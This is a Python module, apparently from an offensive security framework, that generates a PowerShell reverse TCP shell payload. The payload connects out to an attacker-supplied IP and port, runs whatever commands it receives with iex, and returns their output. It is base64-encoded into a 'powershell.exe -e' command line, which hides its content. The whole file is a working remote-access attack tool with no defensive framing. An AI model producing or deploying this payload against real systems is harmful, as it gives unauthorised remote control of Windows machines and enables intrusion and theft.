import sys
import os
import re
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
from utils.db import DB
from utils.output import Output
from server.ressources import get_ressource_md5, powershell_encode_base64

class Payload:
    name = 'reversetcp_powershell'
    type = 'cmd'
    args = ['ip:rsh_port']
    filename = None

    def generate_payload(self, ip_port):

        ip = ip_port.split(':')[0]
        port = int(ip_port.split(':')[1])

        payload = "$client=New-Object System.Net.Sockets.TCPClient(\"{}\",{});$s=$client.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+\"\nPS \"+(pwd).Path+\"> \";$by=\"ASCII\";$sbt = ([text.encoding]::$by).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$client.Close()"
        payload = payload.format(ip, str(port))

        return "powershell.exe -e %s" % powershell_encode_base64(payload)

    def process_output(self, file_path):
        pass
